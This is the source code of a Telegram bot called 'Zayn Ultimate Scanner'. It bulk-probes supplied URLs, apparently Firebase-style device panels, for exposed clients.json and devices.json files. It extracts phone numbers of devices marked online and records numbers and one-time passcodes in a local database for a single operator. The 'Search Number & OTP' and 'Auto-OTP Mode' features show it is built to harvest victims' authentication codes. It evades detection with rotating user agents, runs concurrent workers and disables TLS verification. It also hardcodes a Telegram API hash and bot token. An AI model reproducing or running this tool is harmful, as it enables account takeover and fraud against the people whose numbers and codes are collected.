import asyncio
import re
import base64
import json
import urllib.parse
import html
import io
import os
import sqlite3
import datetime
import time
import random
import csv
from telethon import TelegramClient, events, Button
from telethon.errors import MessageNotModifiedError, FloodWaitError
import aiohttp
import urllib3
from flask import Flask
from threading import Thread

urllib3.disable_warnings()

app = Flask('')

@app.route('/')
def home():
    return "Zayn's Checker Bot is Alive 24/7!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.start()

API_ID = 39714231  
API_HASH = "ed8cb3f998bcf8f51cfeb636f6ea802d" 
BOT_TOKEN = "7986755358:AAEf5S1l7TsrXiUYsxUJxX9v1MQe6b6BbhU" 
TG_CHAT = 6746086497

CHECK_WORKERS = 50
TIMEOUT = 15
DB_FILE = "fb_master.db"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
]

EMOJI = {
    "fire": '<tg-emoji emoji-id="5375146948991166525">🔥</tg-emoji>',
    "skull": '<tg-emoji emoji-id="5368324170671202286">💀</tg-emoji>',
    "check": '<tg-emoji emoji-id="5384463231237674712">✅</tg-emoji>',
    "phone": '<tg-emoji emoji-id="5372981976804366741">📱</tg-emoji>',
    "load": '<tg-emoji emoji-id="5384463231237674712">🟩</tg-emoji>',
    "empty": '<tg-emoji emoji-id="5375384674855663712">⬜</tg-emoji>',
    "wait": '<tg-emoji emoji-id="5384463231237674712">⏳</tg-emoji>'
}

bot = TelegramClient('fb_master_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
state = {}
active_tasks = {}
global_session = None
db_lock = asyncio.Lock()
pagination_state = {}
auto_mode_active = False
auto_mode_task = None

def get_progress_bar(percent):
    filled = int(percent / 10)
    empty = 10 - filled
    return f"[{EMOJI['load'] * filled}{EMOJI['empty'] * empty}] {percent}%"

async def safe_edit(msg, text, **kwargs):
    try: await msg.edit(text, **kwargs)
    except MessageNotModifiedError: pass
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
        try: await msg.edit(text, **kwargs)
        except: pass
    except Exception: pass

async def safe_respond(event, text=None, file=None, **kwargs):
    try: 
        if file: return await event.respond(file=file, message=text, **kwargs)
        return await event.respond(text, **kwargs)
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
        try: 
            if file: return await event.respond(file=file, message=text, **kwargs)
            return await event.respond(text, **kwargs)
        except: return None
    except Exception: return None

def get_headers():
    return {"User-Agent": random.choice(USER_AGENTS), "Accept": "application/json"}

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS numbers
                 (phone TEXT PRIMARY KEY, panel_url TEXT, client_id TEXT, status TEXT, last_checked TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS otp_logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, phone TEXT, otp TEXT, message TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

async def save_to_db(phone_client_pairs, panel_url, status="online"):
    async with db_lock:
        try:
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            now = datetime.datetime.now().isoformat()
            for ph, cid in phone_client_pairs:
                c.execute("INSERT OR REPLACE INTO numbers (phone, panel_url, client_id, status, last_checked) VALUES (?, ?, ?, ?, ?)",
                          (ph, panel_url, cid, status, now))
            conn.commit()
            conn.close()
        except Exception: pass

def search_number_db(phone):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT panel_url, client_id, status FROM numbers WHERE phone = ?", (phone,))
    res = c.fetchone()
    conn.close()
    return res

async def log_otp(phone, otp, message):
    async with db_lock:
        try:
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            now = datetime.datetime.now().isoformat()
            c.execute("INSERT INTO otp_logs (phone, otp, message, timestamp) VALUES (?, ?, ?, ?)", (phone, otp, message, now))
            conn.commit()
            conn.close()
        except Exception: pass

init_db()

def norm10(p):
    if not p: return None
    d = re.sub(r"\D", "", str(p))
    if len(d) > 10:
        if d.startswith("91"): d = d[2:]
        elif d.startswith("0"): d = d[1:]
        else: d = d[-10:]
    return d if len(d) == 10 and d[0] in "6789" else None

async def check_single_fb(url, sem):
    global global_session
    async with sem:
        url = url.strip().rstrip("/")
        if not url.startswith("http"): url = "https://" + url
        res = {"url": url, "status": None, "total": 0, "online": 0, "offline": 0, "pairs": []}
        
        for attempt in range(3):
            try:
                await asyncio.sleep(random.uniform(0.1, 0.4))
                data = None
                for node in ["clients.json", "devices.json"]:
                    async with global_session.get(f"{url}/{node}", timeout=TIMEOUT, ssl=False) as r:
                        if r.status == 200:
                            d = await r.json(content_type=None)
                            if isinstance(d, dict) and d: data = d; break

                if not data: return res

                res["total"] = len(data)
                online_ids = []
                
                for cid, cd in data.items():
                    if not isinstance(cd, dict): continue
                    st = cd.get("status")
                    if st is None: st = cd.get("Status")
                    if st is True or str(st).lower().strip() in ("true", "1", "online", "active", "on"):
                        online_ids.append(cid)
                        
                res["online"] = len(online_ids)
                
                async def fetch_cid_info(cid):
                    cd = data.get(cid, {})
                    raw_phone = cd.get("phone") or cd.get("mobile") or cd.get("number") or cd.get("mobNo")
                    ph = norm10(raw_phone)
                    return {"phone": ph, "cid": cid, "recent_otp": None}

                tasks = [fetch_cid_info(cid) for cid in online_ids]
                fetched = await asyncio.gather(*tasks)
                for item in fetched:
                    if item["phone"]: res["pairs"].append(item)
                
                if res["pairs"]: await save_to_db([(i["phone"], i["cid"]) for i in res["pairs"]], url)
                return res
            except Exception:
                await asyncio.sleep(2)
        return res

def get_main_menu():
    return [
        [Button.inline(f"{EMOJI['fire']} Bulk URLs Check", b"menu_bulk")],
        [Button.inline("🌐 Decode & Check Panel", b"menu_web")],
        [Button.inline(f"{EMOJI['phone']} Search Number & OTP", b"menu_search")],
        [Button.inline("🤖 Auto-OTP Mode (ON/OFF)", b"menu_auto")],
        [Button.inline("🕒 OTP History", b"menu_history")]
    ]

def get_back_menu(): return [[Button.inline("🔙 Back to Menu", b"menu_main")]]

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    global auto_mode_active
    if event.sender_id != TG_CHAT: return
    state[TG_CHAT] = None
    auto_status = "🟢 ON" if auto_mode_active else "🔴 OFF"
    msg = f"{EMOJI['skull']} <b>Zayn Ultimate Scanner</b> {EMOJI['skull']}\n\nAuto-OTP Mode: {auto_status}\n👇 Select an option:"
    await safe_respond(event, msg, buttons=get_main_menu(), parse_mode='html')

if __name__ == '__main__':
    keep_alive()
    print("🚀 Ultimate Checker Started (Cloud Mode)...")
    bot.run_until_disconnected()
